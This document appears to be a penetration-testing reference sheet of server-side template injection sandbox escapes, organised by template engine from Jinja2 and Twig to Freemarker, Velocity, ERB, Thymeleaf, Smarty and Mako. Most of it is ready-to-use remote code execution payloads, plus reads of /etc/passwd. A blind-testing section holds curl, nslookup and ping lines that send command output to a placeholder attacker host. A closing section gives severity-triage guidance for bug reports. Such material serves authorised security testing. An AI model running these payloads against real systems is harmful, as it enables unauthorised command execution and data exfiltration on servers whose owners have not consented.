# SSTI — Sandbox-Escape Matrix (per engine)

Companion to `hunt-ssti`. The main skill covers detection (`{{7*7}}`) + the top RCE
payloads. This file is the **full sandbox-escape map** — the class-walker and
registered-callback variants that work when the common payload fails because the engine
sandboxed `config`, `os`, or attribute access.

## 1. Jinja2 / Flask — the class-walker escape family (ordered by reliability)

```python
# classic — needs `config` or `self` in context
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__class__.__mro__[1].__subclasses__() }}           # enumerate to find Popen/os

# no `config` in context → walk from any object's __class__
{{ ''.__class__.__mro__[1].__subclasses__() }}              # list; find subprocess.Popen index
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}

# find the os module via __globals__ of a loaded class
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# length-constrained: build in stages
{{ '7'*7 }}                                  # detection
{{ [].__class__.__base__.__subclasses__() }} # dump, pick index
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0] }}
```

When `[0]` indexing blocked, `.__getitem__(0)`. When `.` blocked, `|attr('...')` filter.
Blind → `{{ cycler.__init__.__globals__.os.popen('curl http://OOB/?d='+...).read() }}`.

## 2. Twig / Symfony

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
# map/filter without system:
{{ ['id']|map('passthru')|join }}
# when _self blocked:
{{ app.request.server.get('PATH_INFO') }}     # read env (server-side info)
```

## 3. Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ ob("java.lang.ProcessBuilder","id").start() }
<#assign jc=ob("javax.script.ScriptEngineManager")?new()>...  # classloader dance
```

## 4. Velocity (Java)

```
#set($e="e")
#set($rt=$e.getClass().forName("java.lang.Runtime").getRuntime())
#set($p=$rt.exec("id"))
$p.waitFor()
```
Full classloader chain in the security-arsenal tree; the above is the readable short form.

## 5. ERB / Rails

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

## 6. Thymeleaf / Spring (SpEL)

```
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.ProcessBuilder).new('id').start()}
```
When `T()` blocked: `*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}`.

## 7. Smarty (PHP)

```php
{system('id')}
{$smarty.version}
{php}echo shell_exec('id');{/php}              # when {php} allowed
{self::getStreamVariable("file:///etc/passwd")}   # older Smarty SSRF/file read
```

## 8. Mako (Python)

```python
${__import__('os').popen('id').read()}
${open('/etc/passwd').read()}
```

## 9. Blind SSTI — OOB confirmation when no output

```
{{ cycler.__init__.__globals__.os.popen('nslookup $(id).ATTACKER.oast').read() }}
<%= %x{nslookup $(id).ATTACKER.oast} %>
*{T(java.lang.Runtime).getRuntime().exec('ping -c1 $(hostname).ATTACKER.oast')}
```
A callback proves evaluation; command output in the DNS label proves RCE.

## 10. Sandbox-vs-RCE disambiguation

`{{7*7}}→49` proves *evaluation*, not *escape*. Classify the result before scoring:
- Evaluates but every class-walker throws `UndefinedError`/`SecurityError` → **sandboxed → Medium SSTI**, not Critical.
- `{{ ''.__class__.__mro__ }}` resolves → you are on an **unsandboxed** Jinja2 → escalate to `os.popen` → Critical if `id` executes.
- `{{7*7}}→49` in a *client-side* framework (Angular/Vue) → **CSTI = XSS**, report as XSS (server never saw it).